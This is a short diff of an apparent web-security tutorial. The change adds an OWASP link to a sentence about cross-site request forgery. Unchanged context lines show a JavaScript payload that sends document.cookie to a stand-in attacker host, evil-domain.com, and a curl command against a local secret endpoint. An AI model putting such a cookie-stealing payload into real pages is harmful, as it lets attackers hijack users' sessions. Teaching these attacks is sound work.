@@ -174,7 +174,7 @@ uuidv4(); // ⇨ '1b9d6bcd-bbfd-4b2d-9b5d-ab8dfbbd4bed'
 (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
-If we managed to steal a cookie, we can perform a Cross-site request forgery (CSRF) attack.
+If we managed to steal a cookie, we can perform a [Cross-site request forgery (CSRF) attack](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#Double_Submit_Cookie).
 
 ```bash | {type: 'command', failed_when:"exitCode!=0"}
 curl -s localhost:3000/secret
